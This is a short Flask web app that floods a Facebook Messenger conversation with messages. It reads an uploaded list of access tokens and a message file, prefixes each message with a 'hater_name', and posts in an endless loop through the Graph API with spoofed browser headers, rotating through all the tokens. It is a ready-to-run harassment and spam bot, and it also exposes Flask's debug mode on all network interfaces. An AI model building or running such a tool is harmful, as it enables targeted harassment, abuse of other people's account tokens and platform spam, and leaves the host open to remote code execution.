from flask import Flask, request, render_template, url_for
import requests
from threading import Thread, Event
import time

app = Flask(__name__)
app.debug = True

# Headers to simulate web-based request (like being sent from a browser)
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

stop_event = Event()
threads = []

# Function to send messages
def send_messages(access_tokens, thread_id, hater_name, time_interval, messages):
    while not stop_event.is_set():
        for message in messages:
            if stop_event.is_set():
                break
            for access_token in access_tokens:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                full_message = f'{hater_name} {message}'

                parameters = {'access_token': access_token, 'message': full_message}
                response = requests.post(api_url, data=parameters, headers=headers)

                if response.status_code == 200:
                    print(f"Message sent using token {access_token}: {full_message}")
                else:
                    print(f"Failed to send message: {response.status_code}")

                time.sleep(time_interval)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/convo')
def convo():
    return render_template('convo.html')

@app.route('/status')
def status():
    is_active = any(thread.is_alive() for thread in threads)
    return f"Active Threads: {'Yes' if is_active else 'No'}"

@app.route('/start_thread', methods=['POST'])
def start_thread():
    global threads
    token_file = request.files['tokensFile']
    access_tokens = token_file.read().decode().strip().splitlines()

    thread_id = request.form.get('thread_id')
    hater_name = request.form.get('hater_name')
    time_interval = int(request.form.get('delay'))

    messages_file = request.files['messages_file']
    messages = messages_file.read().decode().splitlines()

    if not any(thread.is_alive() for thread in threads):
        stop_event.clear()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, hater_name, time_interval, messages))
        threads.append(thread)
        thread.start()

    return 'Thread started.'

@app.route('/stop_thread', methods=['POST'])
def stop_thread():
    stop_event.set()
    return 'Thread stopped.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
